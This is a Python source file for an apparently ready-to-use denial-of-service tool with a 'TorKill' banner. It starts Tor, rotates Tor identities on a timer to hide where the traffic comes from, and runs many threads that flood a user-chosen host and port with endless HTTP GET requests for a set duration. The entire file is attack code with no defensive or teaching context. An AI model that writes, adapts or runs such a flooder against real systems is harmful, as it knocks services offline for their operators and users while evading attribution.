import os
import sys
import time
import threading
import subprocess
import socket
import socks

from stem import Signal
from stem.control import Controller
from urllib.parse import urlparse

# setup colors
m = '\033[1m\033[35m'  # magenta
g = '\033[1m\033[32m'  # green
w = '\033[1m\033[37m'  # white
r = '\033[1m\033[31m'  # red

targ_ip = None
targ_port = None
targ_site = None

flag = threading.Event()
proxy_lock = threading.Lock()

current_proxy = {"host": "127.0.0.1", "port": 9050}

def update_proxy():
    global current_proxy
    
    with proxy_lock:
        current_proxy = {"host": "127.0.0.1", "port": 9050}

def attack():
    global targ_ip, targ_site, targ_port, flag, current_proxy
    
    while not flag.is_set():
        try:
            with proxy_lock:
                socks.set_default_proxy(socks.SOCKS5, current_proxy["host"], current_proxy["port"])
                
            socket.socket = socks.socksocket
            sock = None

            # initial header
            header = f'GET / HTTP/1.1\r\nHost: {targ_site}\r\nUser-agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n'
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((targ_ip, targ_port))

            # send initial header
            sock.send(header.encode())
            
            # reuse socket / prevent exhaustion
            while not flag.is_set():
                # updated header
                header = f'GET / HTTP/1.1\r\nHost: {targ_site}\r\nUser-agent: Mozilla/5.0\r\n\r\n'
                
                sock.send(header.encode())
        except Exception as e:
            pass

def tor_id(swap):
    global flag
    
    # rotate tor proxy
    while not flag.is_set():
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                
                # update global proxy
                update_proxy()
        except Exception as e:
            print(f"Could not rotate TOR proxy! Error: {e}")
            
        time.sleep(swap)

def tor_svc():
    global w
    try:
        # start tor process
        subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"\r\n{w}[+] Tor service active!")
    except Exception as e:
        exit(f"\r\n{w}[-] Unable to start Tor service! Error: {e}\r\n")

def resolve(site):
    global w, targ_ip, targ_site

    # format host
    if not (site.startswith('http://') or site.startswith('https://')):
        site = 'http://' + site
        
    # attempt hostname resolution
    try:
        # establish ip and raw domain-name
        targ_site = urlparse(site).netloc
        targ_ip = socket.gethostbyname(targ_site)
    except:
        sys.exit(f'\r\n[-] DNS resolution failed! Exiting...\r\n')

def main():
    global m, g, w, r, flag, targ_port

    os.system('clear')

    # ensure tor is running
    tor_svc()

    print(f'''
{m} ______   ___   ____  {g} __  _  ____  _      _     
{m}|      | /   \ |    \ {g}|  |/ ]|    || |    | |    
{m}|      ||     ||  D  ){g}|  ' /  |  | | |    | |    
{m}|_|  |_||  O  ||    / {g}|    \  |  | | |___ | |___ 
{m}  |  |  |     ||    \ {g}|     | |  | |     ||     |
{m}  |  |  |     ||  .  \{g}|  .  | |  | |     ||     |
{m}  |__|   \___/ |__|\_|{g}|__|\_||____||_____||_____|{w}
''')

    # capture user-input
    while True:
        try:
            host = input(f'{w}IP/Domain:{r} ').lower()
            
            # dns resolution
            resolve(host)
            
            targ_port = int(input(f'{w}Port (default 80):{r} ') or 80)
            
            thdz = int(input(f'{w}Threads (default 5):{r} ') or 5)
            
            swap = int(input(f'{w}Proxy rotation (every x-seconds):{r} ') or 5)
            
            dur = int(input(f'{w}Duration (seconds):{r} ') or 60)
            
            # wait for confirmation
            input(f'\r\n{w}Ready? Strike <ENTER> to launch and <CTRL+C> to abort...\r\n')
            
            break
        except KeyboardInterrupt:
            sys.exit()
        except:
            pass
            
    # launch attack
    print('[+] Attacking target! Stand-by...')
    
    # manage thread execution
    tasks = []
    
    # run proxy-rotation routine
    r = threading.Thread(target=tor_id, args=(swap,))
    r.daemon = True
    tasks.append(r)
    r.start()
    
    # execute attack routine/s
    for _ in range(0, thdz):
        t = threading.Thread(target=attack)
        t.daemon = True
        tasks.append(t)
        t.start()

    # wait for attack duration to expire
    _quit = time.time() + dur
    
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
    except:
        pass
    
    # kill active threads
    flag.set()
    
    for t in tasks:
        try:
            t.join()
        except:
            pass
    
    sys.exit('\r\nJob complete!\r\n')

if __name__ == '__main__':
    main()
